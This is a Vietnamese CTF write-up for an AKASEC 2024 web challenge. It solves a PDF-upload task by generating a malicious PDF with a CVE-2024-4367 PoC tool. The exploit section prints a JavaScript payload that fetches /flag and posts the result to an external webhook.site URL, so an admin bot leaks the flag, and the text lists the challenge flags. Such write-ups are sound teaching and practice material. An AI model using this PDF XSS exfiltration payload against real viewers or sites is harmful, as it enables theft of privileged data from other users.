# Đề bài:
![Screenshot (571)](https://github.com/anhshidou/akasecctf-2024/assets/152991010/77f64003-6ff5-4e22-be22-4a6ebe671dfb)

# Hướng làm: 
- Flag sẽ nằm ở path /flag, và chỉ có localhost mới có thể truy cập đến /flag để lấy flag
- Web là 1 ứng dụng upload file pdf, sau đó ta có thể xem pdf đã upload lên bằng /views/ hoặc /uploads/
- Có 1 con bot sẽ truy cập vào url đó rồi trả lại kết quả, và chỉ con bot có thể truy cập được vào flag
- Vậy nên em nảy ra ý tưởng là làm sao để con bot khi ấn vào url sẽ tự động truy cập vào /flag và gửi response về cho 
- Với dữ liệu trên, ý tưởng của bài sẽ là pdf upload to xss để lấy flag

# Tài liệu:
- https://portswigger.net/research/portable-data-exfiltration
- https://github.com/LOURC0D3/CVE-2024-4367-PoC/tree/main (tool sẽ sử dụng trong bài với cái tên bad_pdf.py)

# Exploit:
- Trước hết ta cần đăng nhập trang web

![Screenshot (572)](https://github.com/anhshidou/akasecctf-2024/assets/152991010/1f4e87c2-c397-4799-88da-63c71eff5a75)

- Sau khi login xong ta sẽ có giao diện uploads

![Screenshot (573)](https://github.com/anhshidou/akasecctf-2024/assets/152991010/39596800-c6fa-49aa-ad4d-1a63fb6a6d47)

- Tiếp theo, sử dụng tool để tạo pdf với payload:
 ```
    fetch('/flag')
    .then(response => response.json())
    .then(data => {
        const webhookURL = 'https://webhook.site/d4ac635e-b668-41e5-b82b-1bcbf0bfbfd5';
        return fetch(webhookURL, {
            method: 'POST',
            mode: 'no-cors', 
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
    })
    .then(() => {
        console.log('Request sent to webhook successfully');
    })
    .catch(error => {
        console.error('Error:', error);
    });
```
- Tạo pdf:

![Screenshot (574)](https://github.com/anhshidou/akasecctf-2024/assets/152991010/a1c0436a-8c07-41cc-bd66-d54efe36e9ab)

- Xong đó ta upload lên và ở webhook, ta nhận được response như sau:

![Screenshot (559)](https://github.com/anhshidou/akasecctf-2024/assets/152991010/bcb2290a-51c6-46ac-8500-c8064c527140)

- Nó chính xác là những gì xảy ra nếu ta truy cập vào /flag:

![Screenshot (575)](https://github.com/anhshidou/akasecctf-2024/assets/152991010/043db81c-feb6-41f1-8230-d2c3747f2d24)

- Tiếp theo, ta cóp link dính xss để gửi cho con bot:

![Screenshot (577)](https://github.com/anhshidou/akasecctf-2024/assets/152991010/4218730e-07b8-4057-a57c-e81334f3904f)

- Và ta nhận được flag:

![Screenshot (562)](https://github.com/anhshidou/akasecctf-2024/assets/152991010/952a7233-9adc-4f17-bdb2-b1b95a836059)

# Flag:
- Có vẻ như do có team đã cheat nên flag của tất cả các bài bị đổi lại
- Flag trước khi đổi: AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3}
- Flag sau khi đổi: AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3_r0t4t333d_loooool}

